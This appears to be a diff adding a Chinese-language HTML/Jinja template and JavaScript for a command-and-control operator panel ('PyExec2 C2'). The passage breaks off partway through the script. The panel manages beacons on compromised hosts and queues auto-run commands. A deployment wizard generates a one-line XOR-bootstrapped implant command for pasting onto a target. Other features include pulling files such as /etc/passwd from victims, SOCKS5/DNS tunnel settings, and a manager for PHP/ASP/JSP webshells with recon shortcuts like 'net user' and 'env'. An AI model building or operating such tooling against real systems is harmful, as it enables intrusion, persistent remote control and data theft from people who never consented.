@@ -1,0 +1,2204 @@
+{% extends "base.html" %}
+{% block title %}命令&控制{% endblock %}
+{% block content %}
+<div class="page-head">
+    <h1>命令&控制</h1>
+    <p class="page-sub">PyExec2 C2 工作台 · 伪终端 · 模块管理 · WebShell 连接管理</p>
+</div>
+
+{# ── Tab 切换 ── #}
+<nav class="tabs">
+    <a href="?tab=c2" class="tab cc-tab-link {% if tab != 'webshell' %}active{% endif %}" data-tab="c2">C2 工作台</a>
+    <a href="?tab=webshell" class="tab cc-tab-link {% if tab == 'webshell' %}active{% endif %}" data-tab="webshell">Webshell 管理</a>
+</nav>
+
+{# ══════════ C2 工作台 Tab ══════════ #}
+<div id="tab-c2" {% if tab == 'webshell' %}style="display:none"{% endif %}>
+    <div id="c2-error" class="flash error" style="display:none;"></div>
+
+    <div id="c2-notice" class="c2-notice" style="display:none;margin-bottom:10px;padding:8px 12px;border-radius:6px;font-size:0.8rem;font-family:var(--font-mono);"></div>
+
+    <div class="card" id="c2-status-bar" style="margin-bottom:12px;padding:10px 14px;display:flex;flex-wrap:wrap;gap:8px 18px;align-items:center;font-size:0.76rem;font-family:var(--font-mono);">
+        <span>Beacon <b id="st-beacons" style="color:var(--success);">-</b></span>
+        <span>待办 <b id="st-pending">-</b></span>
+        <span>监听 <b id="st-listen" style="color:var(--text-faint);">-</b></span>
+        <span>implant_key <b id="st-key">-</b></span>
+        <span id="st-clientkey" style="color:var(--danger);">client_key 未生成</span>
+        <span style="flex:1;"></span>
+        <button class="btn btn-sm" onclick="openDeployModal()" title="生成 implant 部署命令">部署向导</button>
+        <button class="btn btn-sm" onclick="openListenerModal()" title="配置 HTTPS/DNS/relay/socks5 等通道">通道配置</button>
+        <button class="btn btn-sm" onclick="openAuditModal()" title="C2 操作审计日志">操作日志</button>
+    </div>
+
+    <div class="c2-workbench">
+        {# ── 左栏：Beacon + 自动执行列表 ── #}
+        <div class="wb-col wb-left">
+            <div class="card panel-beacons">
+                <div class="card-title">
+                    <h3 style="margin:0;">Beacon 列表</h3>
+                    <div class="action-buttons">
+                        <button id="auto-refresh-btn" class="btn btn-sm" onclick="toggleAutoRefresh()">自动刷新: 关</button>
+                        <button class="btn btn-sm" onclick="loadBeacons()">刷新</button>
+                    </div>
+                </div>
+                <div class="form-row" style="margin:8px 0;gap:6px;">
+                    <input type="text" id="beacon-search" class="form-control" placeholder="搜索 ID/用户/平台/tag/备注..."
+                           style="flex:1;font-size:0.75rem;padding:5px 8px;font-family:var(--font-mono);" oninput="renderBeaconList()" aria-label="搜索 beacon">
+                    <span class="help-text" style="margin:0;white-space:nowrap;" id="beacon-sel-info">已选 0</span>
+                </div>
+                <div id="beacon-batch-bar" style="display:none;margin-bottom:8px;gap:6px;flex-wrap:wrap;align-items:center;">
+                    <input type="text" id="batch-cmd" class="form-control" placeholder="批量命令(如 sysinfo / set_interval 10 0.2)"
+                           style="flex:1;min-width:180px;font-size:0.75rem;padding:5px 8px;font-family:var(--font-mono);"
+                           onkeydown="if(event.key==='Enter'){event.preventDefault();execBatchCmd();}" aria-label="批量命令">
+                    <button class="btn btn-sm btn-primary" onclick="execBatchCmd()">批量执行</button>
+                    <button class="btn btn-sm" onclick="clearBeaconSel()">清除</button>
+                </div>
+                <div id="beacon-list" class="beacon-list"></div>
+            </div>
+            <div class="card panel-auto">
+                <div class="card-title">
+                    <h3 style="margin:0;">自动执行列表</h3>
+                    <button class="btn btn-sm" onclick="loadAutoCommands()" title="重新加载服务端 auto_commands">刷新</button>
+                </div>
+                <p class="help-text" style="margin:8px 0;">beacon 首次上线自动下发的命令,按从上到下顺序执行。添加 / 删除 / 拖动排序后自动保存,写回 C2 config.json。</p>
+                <div class="auto-add-row">
+                    <input type="text" id="auto-cmd-input" class="form-control" placeholder="如: sysinfo / set_interval 10 0.2" aria-label="自动执行命令"
+                           style="flex:1;font-family:var(--font-mono);font-size:0.78rem;padding:6px 10px;"
+                           onkeydown="if(event.key==='Enter'){event.preventDefault();addAutoCmd();}">
+                    <button class="btn btn-sm btn-primary" onclick="addAutoCmd()">添加</button>
+                </div>
+                <div id="auto-cmds-list" class="auto-list"></div>
+                <div class="help-text" id="auto-cmds-status" style="margin:6px 0 0;font-family:var(--font-mono);font-size:0.72rem;"></div>
+            </div>
+        </div>
+
+        {# ── 中栏：伪终端 + Python 代码编辑器 ── #}
+        <div class="wb-col wb-main">
+            <div class="term c2-term">
+                <div class="term-bar">
+                    <span class="term-title">pyexec C2 控制台</span>
+                    <span class="term-status" id="console-beacon">未选中 beacon</span>
+                    <button class="btn btn-sm" style="margin-left:auto;padding:1px 8px;font-size:0.7rem;" onclick="clearTerm()" title="清空输出日志">清屏</button>
+                    <button class="btn btn-sm" style="padding:1px 8px;font-size:0.7rem;" onclick="copyTerm()" title="复制输出日志">复制</button>
+                </div>
+                <div class="term-body" id="c2-output">
+                    <div class="term-line tinfo"><span class="term-ts"></span><span>FlowScan pyexec C2 控制台 · Tab 补全命令/模块/beacon（含说明）· ↑↓ 选择 · 回车确认 · Esc 关闭</span></div>
+                </div>
+                <div class="term-input-bar">
+                    <span class="term-prompt">pyexec&gt;</span>
+                    <textarea id="c2-cmd" class="term-input" rows="1" autocomplete="off" spellcheck="false" aria-label="C2 命令输入"
+                              placeholder="show / use &lt;bid&gt; / exec whoami / result ...（回车执行 · Shift+回车换行）"></textarea>
+                    <button class="btn btn-sm btn-primary" onclick="execCmd()" style="white-space:nowrap;">执行</button>
+                    <div id="c2-comp" class="c2-comp" style="display:none;"></div>
+                </div>
+            </div>
+
+            <div class="card panel-editor">
+                <div class="card-title">
+                    <h3 style="margin:0;">Python 代码执行</h3>
+                    <div class="action-buttons">
+                        <select id="py-snippets" class="form-control" aria-label="代码片段库" style="width:150px;padding:4px 8px;font-size:0.75rem;font-family:var(--font-mono);">
+                            <option value="">— 片段库 —</option>
+                        </select>
+                        <button class="btn btn-sm" onclick="loadSnippet()">载入</button>
+                        <button class="btn btn-sm" onclick="saveSnippet()">存片段</button>
+                        <button class="btn btn-sm btn-danger" onclick="delSnippet()">删片段</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendRawCode()">发送到选中 Beacon</button>
+                        <button class="btn btn-sm btn-secondary" onclick="clearEditor()">清空</button>
+                    </div>
+                </div>
+                <textarea id="py-code" class="editor-textarea" rows="10" spellcheck="false" aria-label="Python 代码"
+                    placeholder="Python 代码，将原样下发到选中 beacon 执行（等价于终端 raw 命令，支持多行）。片段保存在浏览器 localStorage。"></textarea>
+                <p class="help-text" style="margin:8px 0 0;">Tab 键插入缩进 · Ctrl+Enter 直接发送 · 结果回显到上方终端</p>
+            </div>
+        </div>
+
+        {# ── 右栏：模块面板 ── #}
+        <div class="wb-col wb-right">
+            <div class="card panel-modules">
+                <nav class="tabs tabs-sm">
+                    <a class="tab active" data-mtab="implant" onclick="return switchMtab('implant')" href="#">植入模块</a>
+                    <a class="tab" data-mtab="server" onclick="return switchMtab('server')" href="#">Server 模块</a>
+                    <a class="tab" data-mtab="manage" onclick="return switchMtab('manage')" href="#">模块管理</a>
+                </nav>
+
+                {# 植入模块 #}
+                <div id="mtab-implant">
+                    <input type="text" id="mod-search" class="form-control" placeholder="搜索模块名..." aria-label="搜索模块名"
+                           style="margin-bottom:8px;font-family:var(--font-mono);font-size:0.8rem;" oninput="renderModuleList()">
+                    <div id="module-list" class="mod-list"></div>
+                </div>
+
+                {# Server 模块 #}
+                <div id="mtab-server" style="display:none;">
+                    <p class="help-text">server 端模块（keygen/build/proxy 等），点击查看详情并可用 s_exec 运行。</p>
+                    <div id="smodule-list" class="mod-list"></div>
+                </div>
+
+                {# 模块管理 #}
+                <div id="mtab-manage" style="display:none;">
+                    <h3 style="font-size:0.85rem;">添加模块</h3>
+                    <input type="text" id="mm-add-filename" class="form-control" placeholder="文件名，如 mymod.py / myseq.json" aria-label="模块文件名"
+                           style="font-family:var(--font-mono);font-size:0.8rem;">
+                    <textarea id="mm-add-content" class="editor-textarea" rows="7" spellcheck="false" aria-label="模块代码"
+                        placeholder="模块代码（.py 含 MODULE 元数据 / .json steps 序列）" style="font-size:0.76rem;"></textarea>
+                    <div class="form-row" style="margin-top:8px;">
+                        <button class="btn btn-sm btn-primary" onclick="addModuleFile()">添加并热加载</button>
+                        <span class="help-text" id="mm-add-status" style="margin:0;font-family:var(--font-mono);"></span>
+                    </div>
+                    <hr>
+                    <h3 style="font-size:0.85rem;">已安装模块文件</h3>
+                    <div id="module-manage-list" class="mod-list"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{# ── 模块详情 / 测试 模态框 ── #}
+<div id="module-modal" class="modal-backdrop" style="display:none;">
+    <div class="modal modal-lg">
+        <h3 id="mm-title">模块详情</h3>
+        <div id="mm-desc" class="help-text" style="margin-bottom:10px;"></div>
+        <div id="mm-params" style="margin-bottom:10px;"></div>
+        <div id="mm-code-wrap" style="display:none;margin-bottom:10px;">
+            <details>
+                <summary>模块源码</summary>
+                <pre class="code-block" id="mm-code" style="max-height:220px;font-size:0.72rem;"></pre>
+            </details>
+        </div>
+        <div id="mm-test-area">
+            <div class="form-row" style="align-items:flex-end;">
+                <div class="form-group" style="margin:0;flex:1;">
+                    <label for="mm-args">参数（空格分隔）</label>
+                    <input type="text" id="mm-args" class="form-control" placeholder="如 / 或 /etc/passwd 0" style="font-family:var(--font-mono);font-size:0.8rem;">
+                </div>
+                <div class="form-group" style="margin:0;">
+                    <label for="mm-platform">目标平台</label>
+                    <select id="mm-platform" class="form-control" style="width:130px;font-family:var(--font-mono);font-size:0.8rem;">
+                        <option value="">自动(beacon)</option>
+                        <option value="linux">linux</option>
+                        <option value="windows">windows</option>
+                        <option value="macos">macos</option>
+                    </select>
+                </div>
+            </div>
+            <div class="form-row" style="margin-top:10px;">
+                <button class="btn btn-sm btn-secondary" onclick="buildModulePreview()">构建预览(dry-run)</button>
+                <button class="btn btn-sm btn-primary" onclick="execModuleFromModal()">下发到选中 Beacon</button>
+                <button class="btn btn-sm" id="mm-srun-btn" onclick="runServerModule()" style="display:none;">运行(s_exec)</button>
+                <button class="btn btn-sm btn-danger" id="mm-del-btn" onclick="deleteModuleFromModal()" style="display:none;">删除模块</button>
+            </div>
+            <pre class="code-block" id="mm-output" style="display:none;margin-top:10px;min-height:60px;max-height:260px;"></pre>
+        </div>
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
+            <button class="btn btn-secondary" onclick="closeModuleModal()">关闭</button>
+        </div>
+    </div>
+</div>
+
+{# ── Beacon 详情抽屉 ── #}
+<div id="beacon-detail-modal" class="modal-backdrop" style="display:none;">
+    <div class="modal modal-lg" style="width:min(880px,94vw);max-height:86vh;overflow:auto;">
+        <h3 id="bd-title">Beacon 详情</h3>
+        <div class="form-row" style="gap:8px;margin:8px 0 12px;flex-wrap:wrap;">
+            <input type="text" id="bd-remark" class="form-control" placeholder="备注(存 Redis,标注目标/用途/进度)" style="flex:1;min-width:200px;font-size:0.78rem;font-family:var(--font-mono);" aria-label="beacon 备注">
+            <button class="btn btn-sm btn-primary" onclick="saveBeaconRemark()">存备注</button>
+            <button class="btn btn-sm" onclick="bdQuick('sysinfo')">sysinfo</button>
+            <button class="btn btn-sm" onclick="bdQuick('exec whoami')">whoami</button>
+            <button class="btn btn-sm" onclick="bdQuick('exec ipconfig')" title="Windows">ipconfig</button>
+            <button class="btn btn-sm" onclick="bdQuick('exec uname -a')" title="Linux">uname -a</button>
+            <button class="btn btn-sm btn-secondary" onclick="bdUseAndClose()">选中并关闭</button>
+        </div>
+        <div id="bd-info" class="help-text" style="margin-bottom:10px;font-family:var(--font-mono);font-size:0.75rem;white-space:pre-wrap;"></div>
+        <h3 style="font-size:0.85rem;margin:10px 0 6px;">待办任务</h3>
+        <div id="bd-tasks" class="help-text" style="font-family:var(--font-mono);font-size:0.72rem;max-height:140px;overflow:auto;"></div>
+        <h3 style="font-size:0.85rem;margin:10px 0 6px;">文件操作</h3>
+        <div class="form-row" style="gap:6px;flex-wrap:wrap;">
+            <input type="text" id="bd-fpath" class="form-control" placeholder="路径(如 /etc/passwd 或 C:\\x.txt)" style="flex:1;min-width:180px;font-size:0.75rem;font-family:var(--font-mono);" aria-label="文件路径">
+            <button class="btn btn-sm" onclick="bdQuick('ls -la ' + fpath())" title="Linux 列目录">ls</button>
+            <button class="btn btn-sm" onclick="bdQuick('dir /a ' + fpath())" title="Windows 列目录">dir</button>
+            <button class="btn btn-sm" onclick="bdQuick('cat ' + fpath())">cat</button>
+            <button class="btn btn-sm" onclick="bdQuick('type ' + fpath())" title="Windows type">type</button>
+            <button class="btn btn-sm btn-secondary" onclick="bdDownload()">download 到服务器</button>
+        </div>
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
+            <button class="btn btn-secondary" onclick="closeBeaconDetail()">关闭</button>
+        </div>
+    </div>
+</div>
+
+{# ── 部署向导 ── #}
+<div id="deploy-modal" class="modal-backdrop" style="display:none;">
+    <div class="modal" style="width:min(760px,92vw);">
+        <h3>部署向导 · 生成 implant</h3>
+        <p class="help-text">生成基础 implant 的单行部署命令(含 XOR bootstrap,可直接粘贴到目标机执行)。生成后 beacon 按 interval/jitter 回连。</p>
+        <div class="form-row" style="gap:10px;margin:12px 0;flex-wrap:wrap;">
+            <div class="form-group" style="margin:0;flex:1;min-width:170px;">
+                <label for="dp-host">服务器地址</label>
+                <input type="text" id="dp-host" class="form-control" placeholder="1.2.3.4 或域名" style="font-family:var(--font-mono);font-size:0.8rem;" value="">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="dp-port">端口</label>
+                <input type="number" id="dp-port" class="form-control" style="width:90px;font-family:var(--font-mono);" value="9001">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="dp-interval">回连间隔(s)</label>
+                <input type="number" id="dp-interval" class="form-control" style="width:90px;font-family:var(--font-mono);" value="60">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="dp-jitter">抖动</label>
+                <input type="number" id="dp-jitter" class="form-control" style="width:80px;font-family:var(--font-mono);" value="0.2" step="0.05">
+            </div>
+        </div>
+        <div class="form-row" style="gap:8px;margin-bottom:10px;">
+            <button class="btn btn-primary" onclick="doBuildDeploy()">生成部署命令</button>
+            <button class="btn btn-sm" onclick="dpCopy()">复制命令</button>
+            <span class="help-text" id="dp-status" style="margin:0;font-family:var(--font-mono);"></span>
+        </div>
+        <pre class="code-block" id="dp-output" style="display:none;max-height:200px;overflow:auto;font-size:0.72rem;"></pre>
+        <p class="help-text" id="dp-note" style="margin:8px 0 0;display:none;"></p>
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
+            <button class="btn btn-secondary" onclick="closeDeployModal()">关闭</button>
+        </div>
+    </div>
+</div>
+
+{# ── 操作日志 ── #}
+<div id="audit-modal" class="modal-backdrop" style="display:none;">
+    <div class="modal modal-lg" style="width:min(860px,94vw);">
+        <h3>C2 操作日志</h3>
+        <div class="form-row" style="gap:8px;margin:8px 0;">
+            <input type="text" id="audit-search" class="form-control" placeholder="过滤(命令/beacon/时间)" style="flex:1;font-size:0.75rem;font-family:var(--font-mono);" oninput="renderAudit()" aria-label="过滤审计日志">
+            <button class="btn btn-sm" onclick="loadAudit()">刷新</button>
+            <button class="btn btn-sm" onclick="exportC2Events()" title="导出 events.jsonl">导出事件</button>
+        </div>
+        <pre class="code-block" id="audit-list" style="max-height:60vh;overflow:auto;font-size:0.72rem;"></pre>
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
+            <button class="btn btn-secondary" onclick="closeAuditModal()">关闭</button>
+        </div>
+    </div>
+</div>
+
+{# ── 通道配置 ── #}
+<div id="listener-modal" class="modal-backdrop" style="display:none;">
+    <div class="modal modal-lg" style="width:min(820px,94vw);">
+        <h3>通道配置(写回 config.json,重启生效)</h3>
+        <p class="help-text">端口填 0 = 关闭该通道。HTTPS/DNS/relay/socks5 变更需重启 C2(beacon 自动重连);server/client 端口与密钥变更也需重启。</p>
+        <div class="form-row" style="gap:12px;margin:12px 0;flex-wrap:wrap;">
+            <div class="form-group" style="margin:0;">
+                <label for="lc-server_port">server 端口</label>
+                <input type="number" id="lc-server_port" class="form-control" style="width:90px;font-family:var(--font-mono);">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-client_port">client 端口</label>
+                <input type="number" id="lc-client_port" class="form-control" style="width:90px;font-family:var(--font-mono);">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-https_port">HTTPS 端口</label>
+                <input type="number" id="lc-https_port" class="form-control" style="width:90px;font-family:var(--font-mono);" placeholder="0=关">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-dns_port">DNS 端口</label>
+                <input type="number" id="lc-dns_port" class="form-control" style="width:90px;font-family:var(--font-mono);" placeholder="0=关">
+            </div>
+        </div>
+        <div class="form-row" style="gap:12px;margin:12px 0;flex-wrap:wrap;">
+            <div class="form-group" style="margin:0;">
+                <label for="lc-relay_port">relay 端口</label>
+                <input type="number" id="lc-relay_port" class="form-control" style="width:90px;font-family:var(--font-mono);" placeholder="0=关">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-socks5_port">SOCKS5 端口</label>
+                <input type="number" id="lc-socks5_port" class="form-control" style="width:90px;font-family:var(--font-mono);" placeholder="0=关">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-client_timeout">client 超时(s)</label>
+                <input type="number" id="lc-client_timeout" class="form-control" style="width:90px;font-family:var(--font-mono);">
+            </div>
+            <div class="form-group" style="margin:0;">
+                <label for="lc-exec_timeout">exec 超时(s)</label>
+                <input type="number" id="lc-exec_timeout" class="form-control" style="width:90px;font-family:var(--font-mono);">
+            </div>
+        </div>
+        <div class="form-row" style="gap:8px;margin-bottom:10px;">
+            <button class="btn btn-primary" onclick="saveListenerConfig()">保存配置</button>
+            <button class="btn btn-sm btn-danger" onclick="restartC2()">重启 C2</button>
+            <span class="help-text" id="lc-status" style="margin:0;font-family:var(--font-mono);"></span>
+        </div>
+        <p class="help-text" id="lc-socks5-hint" style="margin:6px 0 0;display:none;"></p>
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
+            <button class="btn btn-secondary" onclick="closeListenerModal()">关闭</button>
+        </div>
+    </div>
+</div>
+
+{# ══════════ WebShell 管理 Tab ══════════ #}
+<div id="tab-webshell" {% if tab != 'webshell' %}style="display:none"{% endif %}>
+    <div class="layout-2col-side">
+        <div>
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">连接列表 <span class="ws-count" id="ws-count" style="font-size:0.72rem;color:var(--text-muted);"></span></h3>
+                    <button class="btn btn-sm" onclick="loadWsConnections()" title="刷新">刷新</button>
+                </div>
+                <input type="text" id="ws-search" class="form-control" placeholder="搜索 URL/备注/类型..."
+                       style="margin-bottom:8px;font-size:0.78rem;font-family:var(--font-mono);" oninput="renderWsList()" aria-label="搜索连接">
+                <button class="btn btn-primary" onclick="openWsForm()" style="width:100%;margin-bottom:6px;">+ 新建连接</button>
+                <div class="form-row" style="gap:6px;margin-bottom:10px;">
+                    <button class="btn btn-sm" style="flex:1;" onclick="wsExport()" title="导出全部连接为 JSON">导出</button>
+                    <button class="btn btn-sm" style="flex:1;" onclick="wsImport()" title="从 JSON 导入连接">导入</button>
+                </div>
+                <div id="ws-list" style="max-height:52vh;overflow:auto;"></div>
+            </div>
+        </div>
+        <div style="min-width:0;">
+            <div class="card">
+                <div class="card-title" style="align-items:center;">
+                    <h3 id="ws-title" style="margin:0;">连接详情</h3>
+                    <span class="ws-sub-tabs">
+                        <button class="btn btn-sm ws-sub-tab active" data-ws-sub="term" onclick="wsSwitchSub('term')">终端</button>
+                        <button class="btn btn-sm ws-sub-tab" data-ws-sub="file" onclick="wsSwitchSub('file')">文件</button>
+                        <button class="btn btn-sm ws-sub-tab" data-ws-sub="hist" onclick="wsSwitchSub('hist')">历史</button>
+                    </span>
+                </div>
+                <div id="ws-detail" style="margin-bottom:10px;"></div>
+
+                {# ── 子 tab:终端 ── #}
+                <div id="ws-sub-term">
+                    <div class="form-row" style="margin-bottom:8px;flex-wrap:wrap;gap:4px;">
+                        <span class="help-text" style="margin:0;font-size:0.72rem;">快捷:</span>
+                        <button class="btn btn-xs" onclick="wsQuick('whoami')">whoami</button>
+                        <button class="btn btn-xs" onclick="wsQuick('uname -a')">uname -a</button>
+                        <button class="btn btn-xs" onclick="wsQuick('id')">id</button>
+                        <button class="btn btn-xs" onclick="wsQuick('pwd')">pwd</button>
+                        <button class="btn btn-xs" onclick="wsQuick('ls -la')">ls -la</button>
+                        <button class="btn btn-xs" onclick="wsQuick('ipconfig')">ipconfig</button>
+                        <button class="btn btn-xs" onclick="wsQuick('net user')">net user</button>
+                        <button class="btn btn-xs" onclick="wsQuick('systeminfo')">systeminfo</button>
+                        <button class="btn btn-xs" onclick="wsQuick('ps aux')">ps aux</button>
+                        <button class="btn btn-xs" onclick="wsQuick('env')">env</button>
+                    </div>
+                    <div class="form-row" style="margin-bottom:10px;">
+                        <input type="text" id="ws-cmd" class="form-control" placeholder="命令: whoami / ipconfig / ls -la ...（回车执行 · ↑↓ 历史 · Tab 补全）"
+                               style="flex:1;font-family:var(--font-mono);font-size:0.85rem;"
+                               onkeydown="wsCmdKeydown(event)" aria-label="命令输入">
+                        <button class="btn btn-primary" onclick="wsExec()" style="white-space:nowrap;">执行</button>
+                        <input type="number" id="ws-timeout" class="form-control" placeholder="超时s" value="30" min="1" max="300"
+                               style="width:70px;font-family:var(--font-mono);font-size:0.78rem;" aria-label="超时秒数" title="命令超时(1-300s)">
+                    </div>
+                    <div class="form-row" style="margin-bottom:8px;align-items:center;">
+                        <span class="help-text" style="margin:0;font-size:0.72rem;" id="ws-hist-info">执行历史: 0</span>
+                        <button class="btn btn-sm" onclick="clearWsHistory()" style="margin-left:auto;">清空</button>
+                        <button class="btn btn-sm" onclick="copyWsOutput()" style="margin-left:6px;">复制</button>
+                    </div>
+                    <pre id="ws-output" class="code-block ws-output" style="min-height:220px;max-height:44vh;"></pre>
+                </div>
+
+                {# ── 子 tab:文件管理 ── #}
+                <div id="ws-sub-file" style="display:none;">
+                    <div class="form-row" style="margin-bottom:8px;gap:6px;align-items:center;flex-wrap:wrap;">
+                        <span class="help-text" style="margin:0;">当前:</span>
+                        <span id="ws-cwd" class="mono ws-cwd" style="font-size:0.8rem;color:var(--accent);">/</span>
+                        <button class="btn btn-sm" style="margin-left:auto;" onclick="wsFileRefresh()" title="刷新当前目录">刷新</button>
+                        <button class="btn btn-sm" onclick="wsFileOpPrompt('mkdir')">新建目录</button>
+                        <button class="btn btn-sm" onclick="wsUploadFile()">上传文件</button>
+                    </div>
+                    <div id="ws-filelist" style="max-height:44vh;overflow:auto;border:1px solid var(--border);border-radius:var(--radius-sm);background:rgba(3,7,15,0.4);"></div>
+                </div>
+
+                {# ── 子 tab:执行历史 ── #}
+                <div id="ws-sub-hist" style="display:none;">
+                    <div class="form-row" style="margin-bottom:8px;align-items:center;">
+                        <span class="help-text" style="margin:0;">最近 50 次执行(Redis 持久化)</span>
+                        <button class="btn btn-sm" style="margin-left:auto;" onclick="loadWsHistory()">刷新</button>
+                        <button class="btn btn-sm btn-danger" onclick="clearWsHistoryAll()">清空</button>
+                    </div>
+                    <div id="ws-history" style="max-height:48vh;overflow:auto;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{# ── WebShell 连接模态表单(新建/编辑共用) ── #}
+<div id="ws-modal-mask" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:999;align-items:center;justify-content:center;">
+    <div style="width:560px;max-width:94vw;max-height:90vh;overflow:auto;background:var(--surface);border:1px solid var(--border-bright);border-radius:var(--radius);padding:18px 22px;">
+        <div class="card-title" style="margin-bottom:12px;">
+            <h3 id="ws-form-title" style="margin:0;">新建连接</h3>
+            <button class="btn btn-sm" onclick="closeWsForm()">✕</button>
+        </div>
+        <input type="hidden" id="wsf-id">
+        <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+            <div style="grid-column:1/-1;">
+                <label for="wsf-url" style="font-size:0.76rem;color:var(--text-muted);">WebShell URL *</label>
+                <input type="text" id="wsf-url" class="form-control" placeholder="http://target/shell.php" style="font-family:var(--font-mono);font-size:0.82rem;">
+            </div>
+            <div>
+                <label for="wsf-password" style="font-size:0.76rem;color:var(--text-muted);">密码 pass</label>
+                <input type="text" id="wsf-password" class="form-control" placeholder="**** = 保持不变" style="font-family:var(--font-mono);font-size:0.82rem;">
+            </div>
+            <div>
+                <label for="wsf-type" style="font-size:0.76rem;color:var(--text-muted);">类型</label>
+                <select id="wsf-type" class="form-control">
+                    <option value="php">php</option><option value="asp">asp</option>
+                    <option value="aspx">aspx</option><option value="jsp">jsp</option>
+                </select>
+            </div>
+            <div>
+                <label for="wsf-method" style="font-size:0.76rem;color:var(--text-muted);">方法</label>
+                <select id="wsf-method" class="form-control">
+                    <option value="post">post</option><option value="get">get</option>
+                </select>
+            </div>
+            <div>
+                <label for="wsf-cmdparam" style="font-size:0.76rem;color:var(--text-muted);">命令参数名</label>
+                <input type="text" id="wsf-cmdparam" class="form-control" value="cmd" style="font-family:var(--font-mono);font-size:0.82rem;">
+            </div>
+            <div>
+                <label for="wsf-encoding" style="font-size:0.76rem;color:var(--text-muted);">编码</label>
+                <select id="wsf-encoding" class="form-control">
+                    <option value="auto">auto</option><option value="utf-8">utf-8</option>
+                    <option value="gbk">gbk</option><option value="gb18030">gb18030</option>
+                </select>
+            </div>
+            <div>
+                <label for="wsf-os" style="font-size:0.76rem;color:var(--text-muted);">OS(决定文件命令)</label>
+                <select id="wsf-os" class="form-control">
+                    <option value="auto">auto</option><option value="linux">linux</option><option value="windows">windows</option>
+                </select>
+            </div>
+            <div>
+                <label for="wsf-remark" style="font-size:0.76rem;color:var(--text-muted);">备注</label>
+                <input type="text" id="wsf-remark" class="form-control" placeholder="可选">
+            </div>
+            <div style="grid-column:1/-1;">
+                <label for="wsf-cookie" style="font-size:0.76rem;color:var(--text-muted);">Cookie(登录面板可填)</label>
+                <input type="text" id="wsf-cookie" class="form-control" placeholder="可选" style="font-family:var(--font-mono);font-size:0.82rem;">
+            </div>
+        </div>
+        <div class="form-row" style="margin-top:14px;justify-content:flex-end;gap:8px;">
+            <button class="btn" onclick="closeWsForm()">取消</button>
+            <button class="btn btn-primary" onclick="wsFormSave()">保存</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function escapeHtml(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+// ══════════ Tab 切换（c2 / webshell） ══════════
+document.querySelectorAll('.cc-tab-link').forEach(function(link) {
+    link.addEventListener('click', function(e) {
+        var targetTab = this.getAttribute('data-tab');
+        e.preventDefault();
+        document.getElementById('tab-c2').style.display = (targetTab === 'c2') ? '' : 'none';
+        document.getElementById('tab-webshell').style.display = (targetTab === 'webshell') ? '' : 'none';
+        document.querySelectorAll('.cc-tab-link').forEach(function(l) { l.classList.remove('active'); });
+        this.classList.add('active');
+        history.replaceState(null, '', '?tab=' + targetTab);
+        if (targetTab === 'c2') loadStatus();
+        if (targetTab === 'webshell') loadWsConnections();
+    });
+});
+
+// ══════════ 伪终端：状态 / 输出日志 / 历史 / Tab 补全 ══════════
+let currentBid = '';
+let builtinCmds = [];
+let implantNames = [];
+let smodNames = [];
+let beaconIds = [];
+const modDescs = {};  // 模块名 → 描述(补全条目说明)
+
+// 内置命令描述(补全条目说明;未列出的命令显示通用说明)
+const BUILTIN_CMD_DESC = {
+    'show': '查看 beacon 列表与当前会话',
+    'use': '选择 beacon（use <bid>）',
+    'sysinfo': '查询系统信息',
+    'exec': '在 beacon 上执行系统命令',
+    'result': '查看最近执行结果',
+    'modules': '植入模块列表',
+    's_modules': 'server 模块列表',
+    'raw': '下发原始 Python 代码',
+    's_exec': '执行 server 端 Python',
+    'upload': '上传文件到 beacon',
+    'download': '从 beacon 下载文件',
+    'portfwd': '端口转发',
+    'tag': '给 beacon 打标签',
+    'broadcast': '向所有 beacon 广播命令',
+    'config': '查看/修改配置',
+    'info': 'beacon 详情',
+    'log': '事件日志',
+    'platform': '平台信息',
+    'reload': '重载模块',
+    'uplevel': '切换上级会话',
+    'help': '帮助',
+    'exit': '退出会话',
+};
+
+function descFor(name) {
+    if (modDescs[name]) return modDescs[name];
+    if (BUILTIN_CMD_DESC[name]) return BUILTIN_CMD_DESC[name];
+    if (beaconIds.includes(name)) return '在线 beacon';
+    return '';
+}
+let termAutoScroll = true;
+const TERM_MAX_LINES = 2000;
+
+const c2out = document.getElementById('c2-output');
+c2out.addEventListener('scroll', function() {
+    termAutoScroll = (c2out.scrollTop + c2out.clientHeight >= c2out.scrollHeight - 8);
+});
+
+function termAppend(text, cls) {
+    const lines = String(text == null ? '' : text).split('\n');
+    for (const line of lines) {
+        const div = document.createElement('div');
+        const kls = cls || (line.startsWith('[!]') ? 'terr' : line.startsWith('[+]') ? 'tok'
+                   : (line.startsWith('[>]') || line.startsWith('[*]')) ? 'tinfo' : 'tplain');
+        div.className = 'term-line ' + kls;
+        const ts = document.createElement('span');
+        ts.className = 'term-ts';
+        ts.textContent = new Date().toLocaleTimeString('zh-CN', {hour12: false});
+        const body = document.createElement('span');
+        body.className = 'term-line-body';
+        body.textContent = line;
+        div.appendChild(ts);
+        div.appendChild(body);
+        c2out.appendChild(div);
+    }
+    while (c2out.children.length > TERM_MAX_LINES) c2out.removeChild(c2out.firstChild);
